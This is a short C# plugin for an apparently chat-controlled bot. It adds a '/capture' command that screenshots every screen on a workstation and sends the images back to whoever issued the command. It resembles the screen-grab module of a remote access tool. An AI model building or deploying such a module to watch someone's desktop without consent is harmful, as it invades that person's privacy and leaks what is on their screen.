using BotSdk.Contracts;
using BotSdk.Extensions;
using BotSdk.Models;
using CapPlugin.Core;
using System.Drawing;

namespace Plugins.CapScrn
{
    public class DllMain : IModule
    {
        public DllMain()
        {
            Pattern = "/capture";
            Description = "Get a screenshot of the workstation.";
        }

        public override void Execute(Request req)
        {
            var api = new DesktopApi();

            api.Invoke(async screens =>
            {
                foreach (Bitmap screen in screens)
                {
                    var result = new Response(
                        screen.ToMemStream(),
                        req.MessageId
                    );

                    await ResultHandler(result);
                }
            });
        }
    }
}
